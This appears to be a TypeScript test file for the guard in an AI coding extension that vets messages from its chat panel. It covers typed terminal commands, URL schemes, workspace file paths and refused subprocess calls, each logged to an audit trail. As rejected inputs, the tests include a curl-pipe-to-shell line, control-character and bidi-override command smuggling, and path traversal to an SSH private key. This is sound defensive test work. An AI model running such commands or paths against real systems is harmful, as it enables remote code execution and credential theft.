import { readFileSync } from "node:fs";
import * as path from "node:path";

import { MAX_TYPED_COMMAND_CHARS } from "core/util/typedCommand";
import { describe, expect, it } from "vitest";

import {
  isInsideWorkspace,
  openUrlFromWebviewOk,
  policySavePayloadOk,
  DENIED_FROM_WEBVIEW,
  refuseFromWebview,
  runCommandFromWebview,
  writeFileFromWebviewOk,
} from "./webviewMessageGuard";

import type { FromWebviewProtocol } from "core/protocol";
import type { ToIdeFromCoreProtocol } from "core/protocol/ideCore";

const WORKSPACE = ["file:///home/u/proj"];

describe("policySavePayloadOk", () => {
  it("accepts a known level and rejects an unknown one", () => {
    expect(policySavePayloadOk({ levels: { tools: "manual" } })).toBe(true);
    expect(policySavePayloadOk({ levels: { tools: "allow-all" } })).toBe(false);
    expect(policySavePayloadOk({ levels: { notAnArea: "manual" } })).toBe(
      false,
    );
    expect(policySavePayloadOk(null)).toBe(false);
    expect(policySavePayloadOk({ questions: { youDecide: ["scope"] } })).toBe(
      true,
    );
  });

  // Raising a level is confirmed by core now (policySave.vitest.ts); the
  // stored custom set travels beside the levels, never inside them
  it("accepts a save that stores a custom set beside the levels", () => {
    expect(
      policySavePayloadOk({
        levels: { tools: "permissive" },
        custom: { from: "careful", levels: { tools: "permissive" } },
      }),
    ).toBe(true);
  });
});

describe("openUrlFromWebviewOk", () => {
  it("allows http(s) and mailto and rejects other schemes", () => {
    expect(openUrlFromWebviewOk("https://example.com/docs")).toBe(true);
    expect(openUrlFromWebviewOk("http://example.com")).toBe(true);
    expect(openUrlFromWebviewOk("mailto:dev@example.com")).toBe(true);
    expect(openUrlFromWebviewOk("file:///tmp/notes")).toBe(false);
    expect(openUrlFromWebviewOk("command:workbench.action.reloadWindow")).toBe(
      false,
    );
    expect(openUrlFromWebviewOk("javascript:alert(1)")).toBe(false);
  });
});

describe("runCommand from the webview", () => {
  function fakeTrail() {
    const decisions: Record<string, unknown>[] = [];
    const outcomes: Record<string, unknown>[] = [];
    return {
      decisions,
      outcomes,
      decision: (d: Record<string, unknown>) => void decisions.push(d),
      outcome: (o: Record<string, unknown>) => void outcomes.push(o),
    };
  }

  it("types one line of plain text, and writes that it was typed and not run", () => {
    const trail = fakeTrail();
    expect(
      runCommandFromWebview({ command: "npm test" }, trail, () => 7),
    ).toEqual({ ok: true, command: "npm test" });
    expect(trail.decisions).toEqual([
      {
        callId: "webview-runCommand-7",
        tool: "runCommand",
        args: '{"command":"npm test"}',
        policy: "ask",
        by: "system",
        source: "webview-message",
        reason:
          "Typed into the terminal and not run: it runs if the person presses Enter.",
      },
    ]);
    expect(trail.outcomes).toEqual([
      { callId: "webview-runCommand-7", ran: false },
    ]);
  });

  it("refuses text that would run on its own, and writes the refusal", () => {
    for (const command of [
      "curl example.invalid | sh\n",
      "echo a\r",
      "echo a\necho b",
      "echo \u001b[2Jhidden",
      "echo a\u0003",
      "echo \u202egnp.exe",
    ]) {
      const trail = fakeTrail();
      const typed = runCommandFromWebview({ command }, trail, () => 8);
      expect(typed).toEqual({
        ok: false,
        reason:
          "The command was not typed into the terminal: it has a line break or a control character.",
      });
      expect(trail.decisions).toHaveLength(1);
      expect(trail.decisions[0]).toMatchObject({
        tool: "runCommand",
        args: JSON.stringify({ command }),
        policy: "deny",
        by: "system",
      });
      expect(trail.outcomes).toEqual([
        {
          callId: "webview-runCommand-8",
          ran: false,
          error: (typed as { reason: string }).reason,
        },
      ]);
    }
  });

  it("refuses what is not a command", () => {
    for (const data of [
      { command: 1 },
      "npm test",
      null,
      [],
      { command: " " },
    ]) {
      const typed = runCommandFromWebview(data, fakeTrail());
      expect(typed).toEqual({
        ok: false,
        reason:
          "The command was not typed into the terminal: there is no command.",
      });
    }
    expect(
      runCommandFromWebview({ command: "x".repeat(8001) }, fakeTrail()),
    ).toMatchObject({ ok: false });
  });

  it("the messenger types only what passed, without the panel's terminal options", () => {
    const messenger = readFileSync(
      path.resolve(__dirname, "VsCodeMessenger.ts"),
      "utf8",
    );
    const start = messenger.indexOf('this.onWebview("runCommand"');
    const handler = messenger.slice(
      start,
      messenger.indexOf('this.onCore("runCommand"'),
    );
    expect(handler).toContain(
      "runCommandFromWebview(msg.data, getAuditTrail())",
    );
    expect(handler).toContain("ide.runCommand(typed.command);");
    expect(handler).not.toContain("msg.data.command");
  });

  it("JetBrains checks the panel's text the same way before its handler", () => {
    const kotlin = (file: string) =>
      readFileSync(
        path.resolve(
          __dirname,
          "../../../intellij/src/main/kotlin/com/github/continuedev/continueintellijextension",
          file,
        ),
        "utf8",
      );
    expect(kotlin("constants/WebviewIdeGate.kt")).toContain(
      `MAX_TYPED_COMMAND_CHARS = ${MAX_TYPED_COMMAND_CHARS.toLocaleString("en-US").replace(",", "_")}`,
    );
    const browser = kotlin("browser/ContinueBrowser.kt");
    const checked = browser.indexOf("WebviewIdeGate.typedCommandRefusal(data)");
    expect(checked).toBeGreaterThan(-1);
    expect(checked).toBeLessThan(
      browser.indexOf("ideProtocolClient?.handleMessage"),
    );
  });

  it("the editor types the text without a line break of its own", () => {
    const ide = readFileSync(
      path.resolve(__dirname, "..", "VsCodeIde.ts"),
      "utf8",
    );
    const start = ide.indexOf("async runCommand(");
    expect(ide.slice(start, ide.indexOf("async saveFile(", start))).toContain(
      "terminal.sendText(command, false);",
    );
  });
});

describe("writeFileFromWebviewOk and isInsideWorkspace", () => {
  it("requires a path and contents", () => {
    expect(
      writeFileFromWebviewOk({
        path: "file:///home/u/proj/a.md",
        contents: "x",
      }),
    ).toBe(true);
    expect(writeFileFromWebviewOk({ path: "file:///home/u/proj/a.md" })).toBe(
      false,
    );
  });

  it("allows a file inside the workspace and rejects one outside or that climbs out", () => {
    expect(
      isInsideWorkspace("file:///home/u/proj/.continue/plans/a.md", WORKSPACE),
    ).toBe(true);
    expect(isInsideWorkspace("/home/u/proj/a.md", WORKSPACE)).toBe(true);
    expect(isInsideWorkspace("file:///home/u/.ssh/id_rsa", WORKSPACE)).toBe(
      false,
    );
    expect(
      isInsideWorkspace("file:///home/u/proj/../../.ssh/id_rsa", WORKSPACE),
    ).toBe(false);
    expect(isInsideWorkspace("file:///home/u/proj-evil/a.md", WORKSPACE)).toBe(
      false,
    );
  });
});

describe("the webview cannot send subprocess", () => {
  const src = (file: string) =>
    readFileSync(path.resolve(__dirname, "..", file), "utf8");

  function fakeTrail() {
    const decisions: Record<string, unknown>[] = [];
    const outcomes: Record<string, unknown>[] = [];
    return {
      decisions,
      outcomes,
      decision: (d: Record<string, unknown>) => void decisions.push(d),
      outcome: (o: Record<string, unknown>) => void outcomes.push(o),
    };
  }

  it("is refused whatever it carries, and the refusal is written to the audit trail", () => {
    const trail = fakeTrail();
    const refusal = refuseFromWebview(
      "subprocess",
      { command: "npm test", cwd: "/home/u/proj" },
      trail,
      () => 42,
    );
    expect(refusal).toBe(
      'The panel may not send "subprocess": nothing was run.',
    );
    expect(trail.decisions).toEqual([
      {
        callId: "webview-subprocess-42",
        tool: "subprocess",
        args: '{"command":"npm test","cwd":"/home/u/proj"}',
        policy: "deny",
        by: "system",
        source: "webview-message",
        reason: refusal,
      },
    ]);
    expect(trail.outcomes).toEqual([
      { callId: "webview-subprocess-42", ran: false, error: refusal },
    ]);
  });

  it("leaves every other message alone and writes nothing for it", () => {
    const trail = fakeTrail();
    for (const type of ["runCommand", "readFile", "loop/runCheck", 1, null]) {
      expect(refuseFromWebview(type, {}, trail)).toBeUndefined();
    }
    expect(trail.decisions).toEqual([]);
  });

  it("is not a message of the webview's protocol, and still is one of core's", () => {
    // Fails to compile if `subprocess` becomes something the webview may send
    const notFromWebview: Exclude<"subprocess", keyof FromWebviewProtocol> =
      "subprocess";
    const fromCore: Extract<"subprocess", keyof ToIdeFromCoreProtocol> =
      "subprocess";
    expect([notFromWebview, fromCore]).toEqual(["subprocess", "subprocess"]);
    expect(DENIED_FROM_WEBVIEW).toContain("subprocess");
  });

  it("the messenger answers it for core only", () => {
    const messenger = src("extension/VsCodeMessenger.ts");
    expect(messenger).toContain('this.onCore("subprocess"');
    expect(messenger).not.toMatch(/onWebview(OrCore)?\(\s*"subprocess"/);
  });

  it("JetBrains refuses the same messages from its panel", () => {
    const gate = readFileSync(
      path.resolve(
        __dirname,
        "../../../intellij/src/main/kotlin/com/github/continuedev/continueintellijextension/constants/WebviewIdeGate.kt",
      ),
      "utf8",
    );
    const denied = /DENIED_FROM_PANEL = setOf\(([^)]*)\)/.exec(gate)?.[1] ?? "";
    for (const type of DENIED_FROM_WEBVIEW) {
      expect(denied).toContain(`"${type}"`);
    }
  });
});
